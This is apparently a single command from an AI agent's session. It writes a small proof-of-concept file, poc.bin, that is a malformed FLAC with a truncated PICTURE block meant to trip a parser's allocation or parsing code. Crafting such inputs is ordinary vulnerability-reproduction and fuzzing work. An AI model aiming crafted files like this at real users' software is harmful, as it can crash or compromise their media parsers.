Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
payload = bytearray(b'fLaC')
# Streaminfo
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# Picture block header: last block, type 6, length 0x00000020
payload += bytes([0x86,0x00,0x00,0x20])
# Picture fields: type=3, MIME length=0xffffff00-ish impossible but will likely hit allocation/parse. Keep small actual bytes.
payload += b'\x00\x00\x00\x03'   # picture type
payload += b'\x00\x00\x00\x08'   # mime length 8
payload += b'image/jp'                # truncated mime data, missing 'g'
# no more data
p.write_bytes(payload)
print(len(payload))
PY
